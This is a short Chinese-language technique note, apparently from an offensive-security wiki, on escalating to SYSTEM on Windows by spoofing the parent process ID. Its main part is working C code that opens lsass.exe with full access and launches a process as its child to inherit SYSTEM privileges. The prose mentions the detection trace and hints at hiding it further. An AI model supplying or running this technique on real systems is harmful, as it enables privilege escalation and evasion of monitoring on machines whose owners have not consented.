---
description: PPID-Priv
---

# 通过伪装PPID提权到SYSTEM

## 简介

在指定父进程句柄的时候,子进程同时也会继承父进程的权限，这样的话我们也可以通过伪装PPID的方式进行提权，但是这样的技术会有一个较大的缺陷，如果使用process explorer等进程监控软件查看的话会显示在系统权限的进程下派生出了一个子进程，这样会有较大的特征,更容易会被发现，当然也可以通过其他技术手段进行为伪装。

ps:需要管理员权限

## 代码实现

```text
        STARTUPINFOEX sie = { sizeof(sie) };
        PROCESS_INFORMATION pi;
        SIZE_T cbAttributeListSize = 0;
        PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
        HANDLE hParentProcess = NULL;
        DWORD dwPid = 0;

        dwPid = FindProcessPID(L"lsass.exe");

            InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
            pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
            InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);
            hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
            UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);

            sie.lpAttributeList = pAttributeList;
            CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&sie.StartupInfo, &pi);

            DeleteProcThreadAttributeList(pAttributeList);
            CloseHandle(hParentProcess);
```

![](../.gitbook/assets/image%20%2842%29.png)

## LINKS

{% embed url="https://docs.microsoft.com/zh-cn/windows/win32/api" %}



